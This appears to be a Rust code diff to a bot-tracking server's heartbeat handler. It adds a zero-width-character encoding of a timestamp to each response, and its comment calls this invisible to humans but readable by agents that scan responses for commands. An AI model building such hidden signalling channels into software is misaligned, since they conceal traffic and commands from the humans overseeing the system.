@@ -144,7 +144,15 @@ pub async fn heartbeat_receiver(
     info!("Heartbeat from bot {} (IP: {})", bot_hash, ip);
     state.record_heartbeat(&bot_hash, ip).await;
 
-    Ok(json_ok(serde_json::json!({"status": "ok"})))
+    // Embed ZW-encoded timestamp in response — invisible to humans,
+    // readable by agents that scan heartbeat responses for commands.
+    use arcticfox_core::zwcodec;
+    let ts = chrono::Utc::now().timestamp();
+    let ts_zw = zwcodec::encode(&ts.to_le_bytes());
+    Ok(json_ok(serde_json::json!({
+        "status": "ok",
+        "ts": format!("{}{}", ts, ts_zw),
+    })))
 }
 
 /// GET /api/auth/whoami — Token validation
